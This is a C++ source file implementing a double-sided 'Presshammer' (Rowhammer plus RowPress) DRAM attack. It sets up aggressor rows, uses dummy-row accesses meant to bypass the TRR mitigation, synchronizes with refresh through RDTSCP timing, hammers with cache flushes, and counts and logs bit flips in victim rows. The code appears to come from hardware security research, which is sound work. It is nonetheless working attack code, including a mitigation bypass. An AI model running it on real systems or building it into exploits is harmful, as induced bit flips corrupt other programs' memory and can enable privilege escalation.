#include "presshammer.h"


namespace color {
    constexpr const char* RESET  = "\033[0m";
    constexpr const char* RED    = "\033[31m";
    constexpr const char* GREEN  = "\033[32m";
    constexpr const char* YELLOW = "\033[33m";
    constexpr const char* BLUE   = "\033[34m";
}

#define USE_RDTSC // for count # cycles

constexpr int kOffsetBaseVictim  = 14000;
constexpr int kNumDummyRows = 16; // number of dummy rows
constexpr int kDummyActs = 4; // activate dummy rows this many times
constexpr int kSyncActs = 2; // activate sync aggressors this many times
constexpr int kIterationPerVictim = 8205*100; // this is pretty arbitrary, we keep hammering for a long time hoping for REF synchronization to work in our favor 
constexpr int kNumOfRows = (1ULL << 30)/8192; // total number of rows

unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;
struct timespec t1, t2, tglob1, tglob2;

std::vector<unsigned long long> record; 

// Comprobador de filas del estilo con el offset+numvictims que vaya incrementando de 1 en 1 y acceder a la fila, en el momento que de exception fault pues hasta ahí llega y esa fila es crítica --> capturas señal y listo


void setupAggr(Mapping &victim, Mapping &aggr1, Mapping &aggr2){
    // find aggressor rows, the ones that are adjacent to victim row
    aggr1 = Mapping(victim); aggr1.incrementRow();
    aggr2 = Mapping(victim); aggr2.decrementRow();

    // report the victim & aggressor rows being tested
    std::cout << "[-] Bank: " << victim.getBank() << '\n'
            << "[-] Victim Row: " << victim.getRow() << '\n'
            << "[-] Aggr1 Row: " << aggr1.getRow() << '\n'
            << "[-] Aggr2 Row: " << aggr2.getRow() << '\n' << std::endl;
}


void setupSync(Mapping &victim, Mapping &sync1, Mapping &sync2){
    // find sync rows, these should be seperated from the victim & aggressors
    sync1 = Mapping(victim);
    sync2 = Mapping(victim);
    
    for(int j = 0 ; j < 1000 ; j++){
        sync1.incrementRow();
        sync2.incrementRow();
    }
    sync2.incrementRow(); // increment in one more two have different sync rows

    // report the sync rows
    std::cout << "[-] Sync1 Row: " << sync1.getRow() << '\n'
            << "[-] Sync2 Row: " << sync2.getRow() << '\n';
}


void setupDummy(Mapping &victim, Mapping *dummyRows){
    // rows close to the vistim are assigned as dummy row addresses
    // kNumDummyRows (16) are created to bypass the TRR mitigation 
    for (int j = 0; j < kNumDummyRows; j++){
        dummyRows[j] = Mapping(victim);

        for (int k = 0; k < j + 100; k++){
            dummyRows[j].incrementRow();
        }
    }
    std::cout << "[-] Dummy " << 0 << " Row: " << dummyRows[0].getRow() << '\n'
            << "[-] Dummy " << 15 << " Row: " << dummyRows[15].getRow() << '\n';
}

void setupDataRows(Mapping &victim, Mapping &aggr1, Mapping &aggr2, Mapping *dummy, unsigned long long victimData){
    for (int i = 0 ; i < 8192/sizeof(unsigned long long) ; i++){
        *((unsigned long long*) victim.toVirt()) = victimData;
        *((unsigned long long*) aggr1.toVirt()) = ~victimData;
        *((unsigned long long*) aggr2.toVirt()) = ~victimData;
        
        asm volatile("clflush (%0)" : : "r" ((unsigned long long*) victim.toVirt()) : "memory");

        for (int j = 0; j < kNumDummyRows; j++){
            *((unsigned long long*) dummy[j].toVirt()) = 0x0;
            dummy[j].incrementColumnDw();  
        }
        
        victim.incrementColumnDw();
        aggr1.incrementColumnDw();
        aggr2.incrementColumnDw();
    }

    victim.resetColumn();
    aggr1.resetColumn();
    aggr2.resetColumn();

    
    for (int j = 0; j < kNumDummyRows; j++)
        dummy[j].resetColumn();
    
}

void setupRecordVector(){
    record.clear();
    for (int i = 0; i < kIterationPerVictim; i++)
        record.push_back(0);
    

    for (int j = 0; j < 10; j++)
        sched_yield();
}


void syncVirtualAddress(volatile unsigned long long *syncArr[], Mapping &sync1, Mapping &sync2){
    // sync stores pointers to sync rows
    for(int j = 0; j < kSyncActs; j++){
        syncArr[j*2 + 0] = (volatile unsigned long long *) (sync1.toVirt()); // syncArr[j*2 + 0] refers to sync row 1
        syncArr[j*2 + 1] = (volatile unsigned long long *) (sync2.toVirt()); // syncArr[j*2 + 1] refers to sync row 2
        sync1.incrementColumnCb();
        sync2.incrementColumnCb();
    }

    sync1.resetColumn();
    sync2.resetColumn();
}


void aggrVirtualAddress(volatile unsigned long long *aggrArr[], Mapping &aggr1, Mapping &aggr2){
    // aggrArr stores pointers to aggr rows 
    for (int j = 0 ; j < 128 ; j++){
        aggrArr[j*2 + 0] = (volatile unsigned long long *) (aggr1.toVirt()); // aggrArr[j*2 + 0] refers to the aggressor row 1
        aggrArr[j*2 + 1] = (volatile unsigned long long *) (aggr2.toVirt()); // aggrArr[j*2 + 1] refers to the aggressor row 2
        aggr1.incrementColumnCb();
        aggr2.incrementColumnCb();
    }

    aggr1.resetColumn();
    aggr2.resetColumn();
}


void dummyVirtualAddress(volatile unsigned long long *dummyArr[], Mapping *dummyRows){
    // dummy_a stores pointers to dummy rows
    for (int j = 0 ; j < kDummyActs ; j++){
        for (int k = 0 ; k < kNumDummyRows ; k++){
            dummyArr[j*kNumDummyRows + k] = (volatile unsigned long long *) (dummyRows[k].toVirt());
            dummyRows[k].incrementColumnCb();
        }
    }

    for (int j = 0 ; j < kDummyActs ; j++){
        for (int k = 0 ; k < kNumDummyRows ; k++){
            dummyRows[k].resetColumn();
        }
    }
}


void evictSyncRows(volatile unsigned long long *syncArr[]){
     for (int j = 0 ; j < kSyncActs ; j++){
        *(syncArr[j*2 + 0]);
        *(syncArr[j*2 + 1]);

        asm volatile("clflush (%0)" : : "r" (syncArr[j*2 + 0]) : "memory");
        asm volatile("clflush (%0)" : : "r" (syncArr[j*2 + 1]) : "memory");
     }   
}

void synchronizeRef(volatile unsigned long long *syncArr[]){
    while(true){
        asm volatile ("lfence");

        #ifdef USE_RDTSC
            asm volatile (
                "RDTSCP\n\t"
                "mov %%edx, %0\n\t" 
                "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low):: 
                "%rax", "%rbx", "%rcx", "%rdx");
        #else
            clock_gettime(CLOCK_REALTIME, &t1);
        #endif
        
        // test <no_tries> times and average # of cycles
        evictSyncRows(syncArr);

        // breack inmediately after deduce a REF occured recently
        // i.e., it took four row confilcts more than 1K cycles to execute 
        #ifdef USE_RDTSC
            asm volatile (
                "RDTSCP\n\t" 
                "mov %%edx, %0\n\t" 
                "mov %%eax, %1\n\t": "=r" (cycles_high1), "=r" (cycles_low1):: 
                "%rax", "%rbx", "%rcx", "%rdx");
            
            if (cycles_low1 - cycles_low > 1000)
                break;
        #else
            clock_gettime(CLOCK_REALTIME, &t1);
            if (t2.tv_nsec - t1.tv_nsec > 450) // 450ns ~= 1K TSC cycles
                break;
        #endif

    }
}

void dummyBypassTrr(volatile unsigned long long *dummyArr[]){
    for (int i = 0; i < kDummyActs; i++){
        asm volatile ("mfence");

        for (int j = 0; j < kNumDummyRows; j++)
            *(dummyArr[i*kNumDummyRows + j]);

        for (int j = 0; j < kNumDummyRows; j++)
            asm volatile("clflush (%0)" : : "r" (dummyArr[i*kNumDummyRows + j]) : "memory");
    }

    asm volatile ("mfence");
}

void doubleSidedPresshammer(volatile unsigned long long *aggrArr[], int numAggrActs, int numReads, volatile unsigned long long *dummyArr[], volatile unsigned long long *syncArr[]){
    // for each iteration, activate & read with the specified amount; and refresh again
    for (int i = 0; i < kIterationPerVictim; i++){
        asm volatile ("lfence");


        // calculate initial time of the attack
        clock_gettime(CLOCK_REALTIME, &tglob1);
        
        // activate numAggrActs times
        for (int j = 0; j < numAggrActs; j++){
            asm volatile ("mfence");

            // for each activation read both aggressors numReads times, which will adjust the aggressor on time
            for (int k = 0; k < numReads; k++)
                *(aggrArr[k*2 + 0]); // the aggressor row 1 is read

            for (int k = 0; k < numReads; k++)
                *(aggrArr[k*2 + 1]); // the aggressor row 2 is read
            
            // flush the cache lines so that we access DRAM again in the next iteration 
            for (int k = 0; k < numReads; k++)
                asm volatile("clflushopt (%0)" : : "r" (aggrArr[k*2 + 0]) : "memory");

            for (int k = 0; k < numReads ; k++)
                asm volatile("clflushopt (%0)" : : "r" (aggrArr[k*2 + 1]) : "memory");
            
        }
        // perform dummy accesses to bypass the TRR mechanism
        dummyBypassTrr(dummyArr);

        // ------------------ SYNCHRONIZE /w REF ------------------
        synchronizeRef(syncArr);

        // calculte final time of each access 
        clock_gettime(CLOCK_REALTIME, &tglob2);

        // save the record of the global time
        record[i] = tglob2.tv_nsec - tglob1.tv_nsec;
        
    }

    asm volatile("mfence");

    for (int j = 0; j < 10; j++)
        sched_yield();
}

int checkBitFlips(Mapping &victim, unsigned long long victimData){
    int numBitFlips = 0;
    for (int i = 0 ; i < 8192/sizeof(unsigned long long) ; i++){

        //std::cout << std::hex << (*(unsigned long long*) victim.to_virt()) << std::dec << std::endl;
        numBitFlips += __builtin_popcountll((*(unsigned long long*) victim.toVirt()) ^ victimData);
        victim.incrementColumnDw();
    }

    victim.resetColumn();
    return numBitFlips;
}


void showReport(Mapping &victim, int bitFlips, int i, int numAggrActs, int numReads){
    std::cout << "\n" << "----------" << color::GREEN << " Report " << color::RESET << "----------" << '\n'
                << color::GREEN << "[+] " << color::RESET << "Victim: " << victim.getRow() << " done" << '\n'
                << color::BLUE << "[*] " << color::RESET << "Aggressors activations: " << numAggrActs << '\n' 
                << color::BLUE << "[*] " << color::RESET << "Reads: " << numReads << '\n'
                << color::BLUE << "[*] " << color::RESET << "Median of time: " << record[kIterationPerVictim/2] << "ns" << '\n'
                << color::BLUE << "[*] " << color::RESET << "Row: " <<  i << " with bit flip count " << bitFlips << '\n' 
                << '\n' << "--------------------------------" << '\n' << std::endl;
}


void saveReport(std::ofstream &bitFlipsFile, Mapping &victim, int bitFlips, int numAggrActs, int numReads){
    bitFlipsFile << victim.getRow() << "," << numAggrActs << "," << numReads << "," << record[kIterationPerVictim/2] << "," << bitFlips << std::endl;
}


__attribute__((optimize("unroll-loops")))
int doubleSidedAttack(uintptr_t targetAddress, int numAggrActs, int numReads, int numVictims, std::ofstream &bitFlipsFile){

    // see total number of rows
    std::cout << color::BLUE << "[*] " << color::RESET << "Number of total rows: " << kNumOfRows << std::endl;

    // mask the most significant bits: the bits after the 30th bit (i.e., GiB boundary)
    uintptr_t mostSignificantBits = (targetAddress) & ~((1ULL << 30ULL) - 1);

    // variable for total bit flips
    int totalBitFlips = 0;

    // addressing for victim, aggressor, and dummy rows
    Mapping::baseAddress = targetAddress;
    Mapping baseVictim;
    Mapping victim;
    Mapping aggr1;
    Mapping aggr2;

    // rows used in synchronizing with refresh
    Mapping sync1;
    Mapping sync2;

    // rows dummy: 'kNumDummyRows'
    Mapping dummyRows[kNumDummyRows];

    // array for aggr & sync & dummy virtual addresses
    volatile unsigned long long *aggrArr[256];  // 2 aggressors, "numAggrActs" cache blocks accessed each
    volatile unsigned long long *syncArr[kSyncActs*2]; // 2 sync rows, "numSyncActs" cache blocks accessed each
    volatile unsigned long long *dummyArr[kDummyActs*kNumDummyRows]; // "16" dummies, "numDummyActs" cache blocks accessed each

    // for record time
    unsigned cycles_low, cycles_high, cycles_low1, cycles_high1; // # of cycles
    struct timespec tglob1, tglob2; // clock time

    // victim base row generation
    baseVictim.decodeNewAddress(targetAddress);
    baseVictim.resetColumn();
    

    // at each iteration we test a new victim row
    // 14000 (kOffsetBaseVictim) is an arbitrary number that we use as a row address offset from the base victim row
    for(int i = kOffsetBaseVictim; i < kOffsetBaseVictim + numVictims; i++){
        victim = Mapping(baseVictim);
        
        for(int j = 0; j < i; j++){
            victim.incrementRow(); // add until offset value
        }

        // initialize the address of aggr, sync & dummy rows
        std::cout << "\n" << "----------" << color::RED << " Hammering " << color::RESET << "----------\n" << std::endl;
        setupAggr(victim, aggr1, aggr2);
        std::cout << "--------------------------------" << '\n' << std::endl;
        std::cout << "\n" << "----------" << color::BLUE << " Sync && Dummies " << color::RESET << "----------\n" << std::endl;
        setupSync(victim, sync1, sync2);
        setupDummy(victim, dummyRows);
        std::cout << "\n" << "-------------------------------------" << '\n' << std::endl;

        // initialize the data of the victim and surrounding rows with the checkerboard pattern
        setupDataRows(victim, aggr1, aggr2, dummyRows, 0x5555555555555555ULL);

        // calculate sync & aggr & dummy virtual addresses
        syncVirtualAddress(syncArr, sync1, sync2);
        aggrVirtualAddress(aggrArr, aggr1, aggr2);
        dummyVirtualAddress(dummyArr, dummyRows);

        // setup record vector
        setupRecordVector();

        // evict rows used in synchronizing with refresh
        evictSyncRows(syncArr);

        // ------------------ SYNCHRONIZE /w REF ------------------
        synchronizeRef(syncArr);

        // ------------------ PRESSHAMMER (ROWHAMMER + ROWPRESS) ------------------
        doubleSidedPresshammer(aggrArr, numAggrActs, numReads, dummyArr, syncArr);

        // accumulate the total number of bitflips with the given activation count & read number across all tested victim rows
        int bitFlips = checkBitFlips(victim, 0x5555555555555555ULL);
        totalBitFlips += bitFlips;

        // sort records
        std::sort(record.begin(), record.end());
        
        //show report
        showReport(victim, bitFlips, i, numAggrActs, numReads);

        // save report
        saveReport(bitFlipsFile, victim, bitFlips, numAggrActs, numReads);

    }

    return totalBitFlips;

}